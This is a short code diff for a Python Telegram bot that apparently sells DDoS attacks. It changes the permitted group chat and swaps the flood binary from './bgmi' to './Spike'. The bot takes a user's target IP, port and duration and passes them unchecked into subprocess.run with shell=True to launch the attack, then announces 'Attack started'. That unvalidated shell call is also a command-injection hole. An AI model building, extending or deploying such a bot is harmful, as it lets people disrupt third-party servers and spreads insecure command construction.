@@ -20,7 +20,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 admin_id = {"6539807903"} #your admin id
 
 # Allowed Groups
-ALLOWED_GROUPS = {-1002461599613} #grp chat id
+ALLOWED_GROUPS = {-1001985887035} #grp chat id
 
 # Required Channels
 REQUIRED_CHANNELS = ["@gauravbhaihack"] #channel should be PUBLIC 
@@ -100,7 +100,7 @@ def handle_attack(message):
         attack_cooldown[user_id] = current_time
 
         # Execute attack (Replace with actual command)
-        attack_command = f"./bgmi {target} {port} {duration} 800"
+        attack_command = f"./Spike {target} {port} {duration} 512 750"
         subprocess.run(attack_command, shell=True)
 
         bot.reply_to(message, f"🔥 Attack started on {target}:{port} for {duration} seconds.")
